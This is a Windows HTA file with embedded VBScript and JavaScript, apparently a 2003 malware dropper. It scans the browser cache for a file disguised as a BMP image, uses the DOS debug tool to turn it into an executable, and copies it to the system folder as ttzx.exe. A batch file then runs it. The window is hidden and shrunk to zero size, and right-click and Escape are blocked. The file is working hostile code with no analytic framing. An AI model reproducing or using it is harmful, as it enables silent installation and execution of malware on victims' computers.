
<SCRIPT LANGUAGE="VBScript">
'by �¾��.2003.11.http://www.138soft.com,lovejingtao@21cn.com
Option Explicit
Dim FSO,WSH,CACHE,str,sucess
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")
CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
sucess=0

sub FF
 SearchBMPFile fso.GetFolder(CACHE),"ttzx[1].bmp"
 if sucess=0 then SearchBMPFile fso.GetFolder(CACHE),"ttzx[2].bmp"
End sub


Function SearchBMPFile(Folder,fname)
   Dim SubFolder,File,Lt,tmp,winsys
   str=FSO.GetParentFolderName(folder) & "\" & folder.name & "\" & fname');
   if FSO.FileExists(str) then
      tmp=fso.GetSpecialFolder(2) & "\"
      winsys=fso.GetSpecialFolder(1) & "\"
      set File=FSO.GetFile(str)
      File.Copy(tmp & "tmp.dat")
      On Error Resume Next
      File.Delete
      if FSO.FileExists(str) then exit function
      set Lt=FSO.CreateTextFile(tmp & "tmp.in")
      Lt.WriteLine("rbx")
      Lt.WriteLine("0")
      Lt.WriteLine("rcx")
      '�����������ʮ�����Ƶ�EXE�ļ��Ĵ�С
      Lt.WriteLine("C208")
      Lt.WriteLine("w136")
      Lt.WriteLine("q")
      Lt.Close
      set Lt=FSO.CreateTextFile(tmp & "tmp.bat")
      Lt.WriteLine("@echo off")
      Lt.WriteLine("debug " & tmp & "tmp.dat <" & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine("copy " & tmp & "tmp.dat " & winsys & "ttzx.exe>" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.dat >" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine(winsys & "ttzx.exe")
      Lt.Close
      WSH.Run tmp & "tmp.bat",false,6
      On Error Resume Next
      'FSO.GetFile(tmp & "tmp.bat").Delete
      sucess=1
      
      window.close ()
   end if
   If Folder.SubFolders.Count <> 0 Then
      For Each SubFolder In Folder.SubFolders
         SearchBMPFile SubFolder,fname
      Next
   End If
End Function
</script>

<SCRIPT language=JavaScript>
function F()
{
  FF();
  if (sucess==0) setTimeout("F()", 2000);
}
setTimeout("F()", 2000);
parent.moveTo((screen.width-0)/2,(screen.height-0)/2);
parent.resizeTo(0,0);
</SCRIPT>
</head>
<HTA:APPLICATION caption="no" border="none"
SHOWINTASKBAR="no">
<body bgcolor="#ffffff" text="#000000" scroll="no" leftmargin="2" topmargin="3" 
marginwidth="0" marginheight="0" oncontextmenu='self.event.returnvalue=0' 
onkeydown="javascript:if(event.keyCode==27 || event.keyCode==78 && event.ctrlKey)return 
false;">
</body>
</html> 
